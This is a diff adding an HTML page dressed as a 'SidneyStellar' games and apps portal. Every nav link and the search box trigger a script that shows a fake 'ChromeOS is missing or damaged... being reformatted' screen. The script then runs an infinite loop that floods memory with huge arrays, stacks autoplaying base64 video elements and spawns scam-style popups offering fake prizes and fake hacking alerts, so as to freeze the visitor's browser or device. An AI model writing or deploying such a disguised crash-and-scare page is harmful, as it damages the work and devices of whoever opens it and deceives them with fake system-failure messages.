@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SidneyStellar | TOTAL CHAOS</title>
+    <style>
+        :root { --bg-color: #050505; --white: #ffffff; }
+        body, html { margin: 0; padding: 0; height: 100%; background: var(--bg-color); color: var(--white); font-family: sans-serif; overflow: hidden; display: flex; flex-direction: column; }
+        
+        /* CHROME OS ERROR SCREEN */
+        #chrome-error { display: none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: white; color: #5a5a5a; z-index: 10000; text-align: center; padding-top: 10vh; }
+        .yellow-exclamation { display: inline-block; width: 100px; height: 100px; background: #f4b400; color: white; font-size: 70px; line-height: 100px; border-radius: 10px; margin-bottom: 30px; }
+
+        /* AGGRESSIVE POPUP STYLES */
+        .scam-popup { position: absolute; width: 350px; border: 5px solid black; box-shadow: 20px 20px 0px rgba(0,0,0,0.5); z-index: 10001; cursor: move; }
+        .popup-header { background: linear-gradient(to right, #ff0000, #ff8800); color: white; padding: 8px; display: flex; justify-content: space-between; font-weight: 900; border-bottom: 4px solid black; }
+        .popup-body { padding: 30px; text-align: center; color: black; font-size: 20px; font-weight: bold; }
+        .blink { animation: blinker 0.2s linear infinite; }
+        @keyframes blinker { 50% { opacity: 0; } }
+
+        /* MAIN UI */
+        .brand-logo { position: fixed; top: 25px; left: 25px; background: var(--white); color: black; font-weight: 900; padding: 10px 14px; border-radius: 4px; z-index: 100; }
+        nav { display: flex; justify-content: flex-end; padding: 30px 50px; }
+        .nav-item { margin-left: 35px; font-size: 11px; font-weight: 700; letter-spacing: 2px; cursor: pointer; }
+        main { flex-grow: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; }
+        h1 { font-size: 80px; letter-spacing: 6px; }
+        .search-bar { width: 600px; background: #121212; border: none; padding: 20px; border-radius: 6px; color: white; text-align: center; outline: none; }
+    </style>
+</head>
+<body>
+
+    <div id="chrome-error">
+        <div class="yellow-exclamation">!</div>
+        <h1>ChromeOS is missing or damaged.</h1>
+        <p>Your system is currently being reformatted.</p>
+    </div>
+
+    <div class="brand-logo">IN</div>
+    <nav>
+        <span class="nav-item" onclick="startChaos()">GAMES</span>
+        <span class="nav-item" onclick="startChaos()">APPS</span>
+        <span class="nav-item" onclick="startChaos()">SETTINGS</span>
+    </nav>
+
+    <main>
+        <h1>SIDNEYSTELLAR</h1>
+        <input type="text" id="search" class="search-bar" placeholder="Enter to DESTROY system">
+    </main>
+
+    <script>
+        const searchBar = document.getElementById('search');
+        const errorScreen = document.getElementById('chrome-error');
+        
+        // Base64 video data to flood the media engine
+        const crashData = "data:video/mp4;base64,AAAAIGZ0eXBpc29tAAACAGlzb21pc28yYXZjMW1wNDEAAAAIZnJlZQAAAu1tZGF0AAACrQYF//+//8m+P5OXfBeLGOfKE3xkODvFZuBflHv/+VwJIta6cbpIo4ABLoKBaYTkTAAAC7m1vb3YAAABsbXZoZAAAAAAAAAAAAAAAAAAAA+8AAAMAAg8SJZYBAAZo6+JLIsAAAAAYc3R0cwAAAAAAAAABAAAAAQAAQAAAAAAcc3RzYwAAAAAAAAABAAAAAQAAAAEAAAABAAAAFHN0c3oAAAAAAAAC5QAAAAEAAAAUc3RjbwAAAAAAAAABAAAAMAAAAGJ1ZHRhAAAAWm1ldGEAAAAAAAAAIWhkbHIAAAAAAAAAAG1kaXJhcHBsAAAAAAAAAAAAAAAALWlsc3QAAAAlqXRvbwAAAB1kYXRhAAAAAQAAAABMYXZmNTguMTIuMTAw";
+
+        searchBar.addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') startChaos();
+        });
+
+        function startChaos() {
+            // 1. Show the fake error screen first
+            errorScreen.style.display = 'block';
+
+            // 2. Short delay to let the UI update, then trigger the crash
+            setTimeout(() => {
+                const burner = [];
+                
+                // 3. Infinite loop to lock the CPU
+                while(true) {
+                    // Flood RAM
+                    burner.push(new Array(1000000).fill("SYSTEM_FAILURE"));
+
+                    // Flood DOM with Base64 media elements
+                    const v = document.createElement('video');
+                    v.src = crashData;
+                    v.autoplay = true;
+                    v.loop = true;
+                    document.body.appendChild(v);
+
+                    // Add decorative popups before it freezes entirely
+                    spawnPopup();
+                }
+            }, 50); 
+        }
+
+        const ads = [
+            { t: "CRITICAL ERROR", b: "HARD DRIVE FAILURE IMMINENT", c: "#ff0000" },
+            { t: "YOU WON!!!", b: "CLICK FOR 1,000,000 ROBUX", c: "#00ff00" },
+            { t: "SYSTEM HACKED", b: "IP: 127.0.0.1 FOUND", c: "#ffff00" }
+        ];
+
+        function spawnPopup() {
+            const data = ads[Math.floor(Math.random() * ads.length)];
+            const div = document.createElement('div');
+            div.className = 'scam-popup';
+            div.style.left = Math.random() * (window.innerWidth - 350) + "px";
+            div.style.top = Math.random() * (window.innerHeight - 250) + "px";
+            div.style.background = data.c;
+
+            div.innerHTML = `
+                <div class="popup-header"><span>${data.t}</span><span>[X]</span></div>
+                <div class="popup-body"><span class="blink">⚠ ALERT ⚠</span><br>${data.b}</div>
+            `;
+            document.body.appendChild(div);
+        }
+    </script>
+</body>
+</html>
